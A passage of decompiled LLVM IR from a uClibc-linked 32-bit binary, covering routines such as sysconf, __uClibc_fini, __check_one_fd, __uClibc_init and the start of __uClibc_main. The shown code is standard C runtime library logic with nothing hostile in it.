  %v1_804d4ea = call i32 @__errno_location(i32 %v0_804d4ea)
  store i32 %v1_804d4ea, i32* %eax.global-to-local, align 4
  store i32 %v1_804d4ea, i32* @ebx, align 4
  %v1_804d4f1 = inttoptr i32 %v1_804d4ea to i32*
  %v2_804d4f1 = load i32, i32* %v1_804d4f1, align 4
  store i32 %v2_804d4f1, i32* @esi, align 4
  store i32 %v2_804d474, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804d500 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804d500 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804d500, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804d50b = load i32, i32* @esi, align 4
  %v1_804d50b = load i32, i32* @ebx, align 4
  %v2_804d50b = inttoptr i32 %v1_804d50b to i32*
  store i32 %v0_804d50b, i32* %v2_804d50b, align 4
  %v0_804d5a0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d596

dec_label_pc_804d512:                             ; preds = %dec_label_pc_804d4d4
  %v3_804d512 = load i32, i32* %stack_var_-420, align 4
  %v12_804d512 = icmp eq i32 %v3_804d512, 1
  %v2_804d51e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d51e, i32* @ebx, align 4
  %v1_804d525 = icmp eq i1 %v12_804d512, false
  br i1 %v1_804d525, label %dec_label_pc_804d54c, label %dec_label_pc_804d527

dec_label_pc_804d527:                             ; preds = %dec_label_pc_804d512
  %v0_804d527 = load i32, i32* @edi, align 4
  store i32 %v2_804d51e, i32* %stack_var_-460, align 4
  %v4_804d52b = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804d52b = call i32 @__libc_nanosleep(%timespec* %v4_804d52b, i32 %v2_804d51e, i32 %v0_804d527, i32 %v0_804d527)
  store i32 %v5_804d52b, i32* %eax.global-to-local, align 4
  store i32 %v5_804d52b, i32* @edi, align 4
  %v1_804d532 = call i32 @__errno_location(i32 %v2_804d51e)
  store i32 %v1_804d532, i32* %eax.global-to-local, align 4
  store i32 %v1_804d532, i32* @ebx, align 4
  %v1_804d53c = inttoptr i32 %v1_804d532 to i32*
  %v2_804d53c = load i32, i32* %v1_804d53c, align 4
  store i32 %v2_804d53c, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804d543 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804d543 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804d543, i32 0)
  store i32 %v4_804d543, i32* %eax.global-to-local, align 4
  %v0_804d548 = load i32, i32* @esi, align 4
  %v1_804d548 = load i32, i32* @ebx, align 4
  %v2_804d548 = inttoptr i32 %v1_804d548 to i32*
  store i32 %v0_804d548, i32* %v2_804d548, align 4
  %v0_804d572.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d56f

dec_label_pc_804d54c:                             ; preds = %dec_label_pc_804d512
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804d552 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804d552 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804d552, i32 0)
  store i32 %v4_804d552, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d568

dec_label_pc_804d55d:                             ; preds = %dec_label_pc_804d48f
  %v2_804d55f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d55f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d568

dec_label_pc_804d568:                             ; preds = %dec_label_pc_804d54c, %dec_label_pc_804d55d
  %storemerge3.pre-phi = phi i32 [ %v2_804d51e, %dec_label_pc_804d54c ], [ %v2_804d55f, %dec_label_pc_804d55d ]
  %v3_804d568 = phi i32 [ %v2_804d474, %dec_label_pc_804d54c ], [ %v4_804d494, %dec_label_pc_804d55d ]
  %v2_804d568 = phi i32 [ 0, %dec_label_pc_804d54c ], [ %v4_804d494, %dec_label_pc_804d55d ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_804d568 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804d568 = call i32 @__libc_nanosleep(%timespec* %v4_804d568, i32 %storemerge3.pre-phi, i32 %v2_804d568, i32 %v3_804d568)
  store i32 %v5_804d568, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d56f

dec_label_pc_804d56f:                             ; preds = %dec_label_pc_804d527, %dec_label_pc_804d568
  %v0_804d572 = phi i32 [ %v0_804d572.pre, %dec_label_pc_804d527 ], [ %v5_804d568, %dec_label_pc_804d568 ]
  %v1_804d572 = icmp eq i32 %v0_804d572, 0
  br i1 %v1_804d572, label %dec_label_pc_804d58f, label %dec_label_pc_804d576

dec_label_pc_804d576:                             ; preds = %dec_label_pc_804d56f
  %v4_804d586 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_804d586, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d596

dec_label_pc_804d58f:                             ; preds = %entry, %dec_label_pc_804d56f
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d596

dec_label_pc_804d593:                             ; preds = %dec_label_pc_804d4b8, %dec_label_pc_804d473, %dec_label_pc_804d445
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d596

dec_label_pc_804d596:                             ; preds = %dec_label_pc_804d58f, %dec_label_pc_804d576, %dec_label_pc_804d4ea, %dec_label_pc_804d593
  %v0_804d5a0 = phi i32 [ 0, %dec_label_pc_804d58f ], [ %v4_804d586, %dec_label_pc_804d576 ], [ %v0_804d5a0.pre, %dec_label_pc_804d4ea ], [ -1, %dec_label_pc_804d593 ]
  store i32 %v0_804d41b, i32* @ebx, align 4
  store i32 %v0_804d41a, i32* @esi, align 4
  store i32 %v0_804d419, i32* @edi, align 4
  store i32 %v0_804d418, i32* @ebp, align 4
  ret i32 %v0_804d5a0

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804d532, { 1, 0, 2 }
  uselistorder i32 %v2_804d51e, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804d4b5, { 2, 1, 0 }
  uselistorder i32 %v4_804d494, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804d474, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_804d45b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_804d442, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d596, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d58f, { 1, 0 }
  uselistorder label %dec_label_pc_804d56f, { 1, 0 }
  uselistorder label %dec_label_pc_804d568, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_804d5c3 [
    i32 0, label %dec_label_pc_804d5d3
    i32 1, label %dec_label_pc_804d6b8
    i32 2, label %dec_label_pc_804d5dd
    i32 3, label %dec_label_pc_804d5e7
    i32 4, label %dec_label_pc_804d5f1
    i32 5, label %dec_label_pc_804d687
    i32 6, label %dec_label_pc_804d5f9
    i32 7, label %dec_label_pc_804d5b9
    i32 8, label %dec_label_pc_804d5b9
    i32 9, label %dec_label_pc_804d5b9
    i32 10, label %dec_label_pc_804d5b9
    i32 11, label %dec_label_pc_804d5b9
    i32 12, label %dec_label_pc_804d5b9
    i32 13, label %dec_label_pc_804d5b9
    i32 14, label %dec_label_pc_804d5b9
    i32 15, label %dec_label_pc_804d5b9
    i32 16, label %dec_label_pc_804d5b9
    i32 17, label %dec_label_pc_804d5b9
    i32 18, label %dec_label_pc_804d5b9
    i32 19, label %dec_label_pc_804d5b9
    i32 20, label %dec_label_pc_804d5b9
    i32 21, label %dec_label_pc_804d5b9
    i32 22, label %dec_label_pc_804d5b9
    i32 23, label %dec_label_pc_804d6b8
    i32 24, label %dec_label_pc_804d6b8
    i32 25, label %dec_label_pc_804d6c4
    i32 26, label %dec_label_pc_804d695
    i32 27, label %dec_label_pc_804d6b8
    i32 28, label %dec_label_pc_804d60b
    i32 29, label %dec_label_pc_804d68e
    i32 30, label %dec_label_pc_804d603
    i32 31, label %dec_label_pc_804d6a3
    i32 32, label %dec_label_pc_804d6b8
    i32 33, label %dec_label_pc_804d6b8
    i32 34, label %dec_label_pc_804d6b8
    i32 35, label %dec_label_pc_804d69c
    i32 36, label %dec_label_pc_804d6cb
    i32 37, label %dec_label_pc_804d6d2
    i32 38, label %dec_label_pc_804d6cb
    i32 39, label %dec_label_pc_804d615
    i32 40, label %dec_label_pc_804d6d9
    i32 41, label %dec_label_pc_804d6b8
    i32 42, label %dec_label_pc_804d6a3
    i32 43, label %dec_label_pc_804d6d2
    i32 44, label %dec_label_pc_804d6e0
    i32 45, label %dec_label_pc_804d6d2
    i32 46, label %dec_label_pc_804d68e
    i32 47, label %dec_label_pc_804d68e
    i32 48, label %dec_label_pc_804d68e
    i32 49, label %dec_label_pc_804d6b8
    i32 50, label %dec_label_pc_804d6b8
    i32 51, label %dec_label_pc_804d68e
    i32 52, label %dec_label_pc_804d68e
    i32 53, label %dec_label_pc_804d6b8
    i32 54, label %dec_label_pc_804d6b8
    i32 55, label %dec_label_pc_804d6b8
    i32 56, label %dec_label_pc_804d6b8
    i32 57, label %dec_label_pc_804d6b8
    i32 58, label %dec_label_pc_804d6b8
    i32 59, label %dec_label_pc_804d6b8
    i32 60, label %dec_label_pc_804d6b8
    i32 61, label %dec_label_pc_804d6b8
    i32 62, label %dec_label_pc_804d6b8
    i32 63, label %dec_label_pc_804d6b8
    i32 64, label %dec_label_pc_804d6b8
    i32 65, label %dec_label_pc_804d6b8
    i32 66, label %dec_label_pc_804d6b8
    i32 67, label %dec_label_pc_804d5b9
    i32 68, label %dec_label_pc_804d5b9
    i32 69, label %dec_label_pc_804d69c
    i32 70, label %dec_label_pc_804d69c
    i32 71, label %dec_label_pc_804d69c
    i32 72, label %dec_label_pc_804d6a3
    i32 73, label %dec_label_pc_804d6aa
    i32 74, label %dec_label_pc_804d6b1
    i32 75, label %dec_label_pc_804d61f
    i32 76, label %dec_label_pc_804d6b1
    i32 77, label %dec_label_pc_804d5b9
    i32 78, label %dec_label_pc_804d5b9
    i32 79, label %dec_label_pc_804d5b9
    i32 80, label %dec_label_pc_804d5b9
    i32 81, label %dec_label_pc_804d5b9
    i32 82, label %dec_label_pc_804d5b9
    i32 83, label %dec_label_pc_804d5b9
    i32 84, label %dec_label_pc_804d5b9
    i32 85, label %dec_label_pc_804d6b8
    i32 86, label %dec_label_pc_804d6b8
    i32 87, label %dec_label_pc_804d695
    i32 88, label %dec_label_pc_804d629
    i32 89, label %dec_label_pc_804d633
    i32 90, label %dec_label_pc_804d6aa
    i32 91, label %dec_label_pc_804d5b9
    i32 92, label %dec_label_pc_804d5b9
    i32 93, label %dec_label_pc_804d5b9
    i32 94, label %dec_label_pc_804d5b9
    i32 95, label %dec_label_pc_804d68e
    i32 96, label %dec_label_pc_804d6b8
    i32 97, label %dec_label_pc_804d6b8
    i32 98, label %dec_label_pc_804d5b9
    i32 99, label %dec_label_pc_804d5b9
    i32 100, label %dec_label_pc_804d5b9
    i32 101, label %dec_label_pc_804d63d
    i32 102, label %dec_label_pc_804d680
    i32 103, label %dec_label_pc_804d6bd
    i32 104, label %dec_label_pc_804d695
    i32 105, label %dec_label_pc_804d647
    i32 106, label %dec_label_pc_804d6a3
    i32 107, label %dec_label_pc_804d6a3
    i32 108, label %dec_label_pc_804d687
    i32 109, label %dec_label_pc_804d6c4
    i32 110, label %dec_label_pc_804d6e0
    i32 111, label %dec_label_pc_804d680
    i32 112, label %dec_label_pc_804d6bd
    i32 113, label %dec_label_pc_804d6e0
    i32 114, label %dec_label_pc_804d651
    i32 115, label %dec_label_pc_804d6d9
    i32 116, label %dec_label_pc_804d6b8
    i32 117, label %dec_label_pc_804d6b8
    i32 118, label %dec_label_pc_804d65b
    i32 119, label %dec_label_pc_804d665
    i32 120, label %dec_label_pc_804d6d2
    i32 121, label %dec_label_pc_804d695
    i32 122, label %dec_label_pc_804d695
    i32 123, label %dec_label_pc_804d695
    i32 124, label %dec_label_pc_804d695
    i32 125, label %dec_label_pc_804d5b9
    i32 126, label %dec_label_pc_804d5b9
    i32 127, label %dec_label_pc_804d6b8
    i32 128, label %dec_label_pc_804d6b8
    i32 129, label %dec_label_pc_804d5b9
    i32 130, label %dec_label_pc_804d5b9
    i32 131, label %dec_label_pc_804d6b8
    i32 149, label %dec_label_pc_804d66c
  ]

dec_label_pc_804d5b9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d5c3:                             ; preds = %entry
  %v1_804d5c3 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804d5c8 = inttoptr i32 %v1_804d5c3 to i32*
  store i32 22, i32* %v1_804d5c8, align 4
  br label %dec_label_pc_804d6b8

dec_label_pc_804d5d3:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d5dd:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d5e7:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d5f1:                             ; preds = %entry
  %v0_804d5f4 = call i32 @getdtablesize()
  br label %dec_label_pc_804d5f9

dec_label_pc_804d5f9:                             ; preds = %entry, %dec_label_pc_804d5f1
  br label %dec_label_pc_804d6e5

dec_label_pc_804d603:                             ; preds = %entry
  %v3_804d606 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804d60b

dec_label_pc_804d60b:                             ; preds = %entry, %dec_label_pc_804d603
  br label %dec_label_pc_804d6e5

dec_label_pc_804d615:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d61f:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d629:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d633:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d63d:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d647:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d651:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d65b:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d665:                             ; preds = %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d66c:                             ; preds = %entry
  %v5_804d672 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804d67a = icmp slt i32 %v5_804d672, 0
  %v1_804d67c = icmp eq i1 %v2_804d67a, false
  br i1 %v1_804d67c, label %dec_label_pc_804d68e, label %dec_label_pc_804d6b8

dec_label_pc_804d680:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d687:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d68e:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804d66c
  br label %dec_label_pc_804d6e5

dec_label_pc_804d695:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d69c:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6a3:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6aa:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6b1:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6b8:                             ; preds = %dec_label_pc_804d66c, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804d5c3
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6bd:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6c4:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6cb:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6d2:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6d9:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6e0:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6e5:                             ; preds = %dec_label_pc_804d6d9, %dec_label_pc_804d6d2, %dec_label_pc_804d6cb, %dec_label_pc_804d6c4, %dec_label_pc_804d6bd, %dec_label_pc_804d6b1, %dec_label_pc_804d6aa, %dec_label_pc_804d6a3, %dec_label_pc_804d69c, %dec_label_pc_804d695, %dec_label_pc_804d687, %dec_label_pc_804d680, %dec_label_pc_804d68e, %dec_label_pc_804d665, %dec_label_pc_804d65b, %dec_label_pc_804d651, %dec_label_pc_804d647, %dec_label_pc_804d63d, %dec_label_pc_804d633, %dec_label_pc_804d629, %dec_label_pc_804d61f, %dec_label_pc_804d615, %dec_label_pc_804d60b, %dec_label_pc_804d5f9, %dec_label_pc_804d5e7, %dec_label_pc_804d5dd, %dec_label_pc_804d6b8, %dec_label_pc_804d5d3, %dec_label_pc_804d5b9, %dec_label_pc_804d6e0
  %v0_804d6e8 = phi i32 [ 255, %dec_label_pc_804d6d9 ], [ 2048, %dec_label_pc_804d6d2 ], [ 99, %dec_label_pc_804d6cb ], [ 20, %dec_label_pc_804d6c4 ], [ -128, %dec_label_pc_804d6bd ], [ 1024, %dec_label_pc_804d6b1 ], [ 4, %dec_label_pc_804d6aa ], [ 32, %dec_label_pc_804d6a3 ], [ 256, %dec_label_pc_804d69c ], [ 2147483647, %dec_label_pc_804d695 ], [ 16, %dec_label_pc_804d687 ], [ 127, %dec_label_pc_804d680 ], [ 200112, %dec_label_pc_804d68e ], [ 9, %dec_label_pc_804d665 ], [ 65535, %dec_label_pc_804d65b ], [ -32768, %dec_label_pc_804d651 ], [ -2147483648, %dec_label_pc_804d647 ], [ 8, %dec_label_pc_804d63d ], [ 500, %dec_label_pc_804d633 ], [ 4096, %dec_label_pc_804d629 ], [ 16384, %dec_label_pc_804d61f ], [ 1000, %dec_label_pc_804d615 ], [ 32768, %dec_label_pc_804d60b ], [ 6, %dec_label_pc_804d5f9 ], [ 65536, %dec_label_pc_804d5e7 ], [ 100, %dec_label_pc_804d5dd ], [ -1, %dec_label_pc_804d6b8 ], [ 131072, %dec_label_pc_804d5d3 ], [ 1, %dec_label_pc_804d5b9 ], [ 32767, %dec_label_pc_804d6e0 ]
  ret i32 %v0_804d6e8

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 50, { 2, 1, 0 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 30, { 1, 0 }
  uselistorder i32 19, { 3, 1, 0, 2 }
  uselistorder i32 13, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d6e5, { 29, 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28 }
  uselistorder label %dec_label_pc_804d6b8, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804d68e, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804d60b, { 1, 0 }
  uselistorder label %dec_label_pc_804d5f9, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d6ec = load i32, i32* @ebx, align 4
  store i32 %v0_804d6ec, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), i32 2), i32 0), label %dec_label_pc_804d700, label %dec_label_pc_804d70d

dec_label_pc_804d700:                             ; preds = %entry, %dec_label_pc_804d700
  %v1_804d7078 = phi i32 [ %v1_804d707, %dec_label_pc_804d700 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_804d707.379 to i32), i32* %stack_var_-16, align 4
  %v5_804d700 = mul i32 %v1_804d7078, 4
  %v6_804d700 = add i32 %v5_804d700, ptrtoint (i32* @global_var_8053be8.378 to i32)
  %v7_804d700 = inttoptr i32 %v6_804d700 to i32*
  %v8_804d700 = load i32, i32* %v7_804d700, align 4
  call void @__pseudo_call(i32 %v8_804d700)
  %v0_804d707.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d707 = add i32 %v0_804d707.pre, -1
  store i32 %v1_804d707, i32* %ebx.global-to-local, align 4
  %v10_804d708 = icmp eq i32 %v0_804d707.pre, 0
  %v1_804d70b = icmp eq i1 %v10_804d708, false
  br i1 %v1_804d70b, label %dec_label_pc_804d700, label %dec_label_pc_804d70d

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d700, %entry
  %v0_804d70d = load i32, i32* @global_var_80569d4.380, align 4
  %v1_804d712 = icmp eq i32 %v0_804d70d, 0
  br i1 %v1_804d712, label %dec_label_pc_804d718, label %dec_label_pc_804d716

dec_label_pc_804d716:                             ; preds = %dec_label_pc_804d70d
  %v0_804d716 = load i32, i32* %stack_var_-16, align 4
  %v1_804d716 = call i32 @unknown_0(i32 %v0_804d716)
  br label %dec_label_pc_804d718

dec_label_pc_804d718:                             ; preds = %dec_label_pc_804d716, %dec_label_pc_804d70d
  %v0_804d718 = load i32, i32* @global_var_80569d8.381, align 8
  %v1_804d71e = icmp eq i32 %v0_804d718, 0
  br i1 %v1_804d71e, label %dec_label_pc_804d727, label %dec_label_pc_804d722

dec_label_pc_804d722:                             ; preds = %dec_label_pc_804d718
  %v2_804d722 = load i32, i32* %stack_var_-16, align 4
  %v1_804d725 = call i32 @unknown_0(i32 %v2_804d722)
  br label %dec_label_pc_804d727

dec_label_pc_804d727:                             ; preds = %dec_label_pc_804d722, %dec_label_pc_804d718
  %v2_804d727 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_804d727

; uselistorder directives
  uselistorder i32 %v1_804d707, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d700, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804d72e = load i32, i32* @eax, align 4
  ret i32 %v0_804d72e
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d72f = load i32, i32* @esi, align 4
  %v0_804d730 = load i32, i32* @ebx, align 4
  store i32 %v0_804d730, i32* %stack_var_-8, align 4
  %v0_804d734 = load i32, i32* @eax, align 4
  store i32 %v0_804d734, i32* @esi, align 4
  %v0_804d736 = load i32, i32* @edx, align 4
  store i32 %v0_804d736, i32* @ebx, align 4
  %v5_804d73b = call i32 @__libc_fcntl(i32 %v0_804d734, i32 1, i32 %tmp6, i32 %tmp2)
  %v1_804d743 = add i32 %v5_804d73b, 1
  %v8_804d743 = icmp eq i32 %v1_804d743, 0
  %v1_804d744 = icmp eq i1 %v8_804d743, false
  br i1 %v1_804d744, label %dec_label_pc_804d75f, label %dec_label_pc_804d746

dec_label_pc_804d746:                             ; preds = %entry
  %v0_804d748 = load i32, i32* @ebx, align 4
  %v5_804d74e = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805246c.382, i32 0, i32 0), i32 %v0_804d748, i32 %v1_804d743)
  %v1_804d756 = load i32, i32* @esi, align 4
  %v12_804d756 = icmp eq i32 %v5_804d74e, %v1_804d756
  br i1 %v12_804d756, label %dec_label_pc_804d75f, label %dec_label_pc_804d75a

dec_label_pc_804d75a:                             ; preds = %dec_label_pc_804d746
  %v0_804d75a = call i32 @abort()
  br label %dec_label_pc_804d75f

dec_label_pc_804d75f:                             ; preds = %dec_label_pc_804d746, %entry, %dec_label_pc_804d75a
  %v2_804d75f = load i32, i32* %stack_var_-12, align 4
  %v2_804d760 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d760, i32* @ebx, align 4
  store i32 %v0_804d72f, i32* @esi, align 4
  ret i32 %v2_804d75f

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804d75f, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_804d766 = load i8, i8* @global_var_80569dc.383, align 4
  %v1_804d766 = icmp eq i8 %v0_804d766, 0
  %v1_804d76d = icmp eq i1 %v1_804d766, false
  br i1 %v1_804d76d, label %entry.dec_label_pc_804d79f_crit_edge, label %dec_label_pc_804d76f

entry.dec_label_pc_804d79f_crit_edge:             ; preds = %entry
  %v0_804d7a2.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804d79f

dec_label_pc_804d76f:                             ; preds = %entry
  store i8 1, i8* @global_var_80569dc.383, align 4
  store i32 4096, i32* @global_var_80569d0.307, align 16
  %v0_804d79a = call i32 @_stdio_init()
  br label %dec_label_pc_804d79f

dec_label_pc_804d79f:                             ; preds = %entry.dec_label_pc_804d79f_crit_edge, %dec_label_pc_804d76f
  %v0_804d7a2 = phi i32 [ %v0_804d7a2.pre, %entry.dec_label_pc_804d79f_crit_edge ], [ %v0_804d79a, %dec_label_pc_804d76f ]
  ret i32 %v0_804d7a2

; uselistorder directives
  uselistorder i8* @global_var_80569dc.383, { 1, 0 }
  uselistorder label %dec_label_pc_804d79f, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_804d7a3 = load i32, i32* @ebp, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80569c8.384, align 8
  store i32 %arg6, i32* @global_var_80569d8.381, align 8
  %v2_804d7da = mul i32 %arg2, 4
  %v3_804d7da = add i32 %tmp31, %v2_804d7da
  %v1_804d7dd = add i32 %v3_804d7da, 4
  store i32 %v1_804d7dd, i32* @global_var_80569cc.376, align 4
  %v3_804d7e5 = load i32, i32* %arg3, align 4
  %v14_804d7e5 = icmp eq i32 %v1_804d7dd, %v3_804d7e5
  %v1_804d7e7 = icmp eq i1 %v14_804d7e5, false
  br i1 %v1_804d7e7, label %dec_label_pc_804d7ef, label %dec_label_pc_804d7e9

dec_label_pc_804d7e9:                             ; preds = %entry
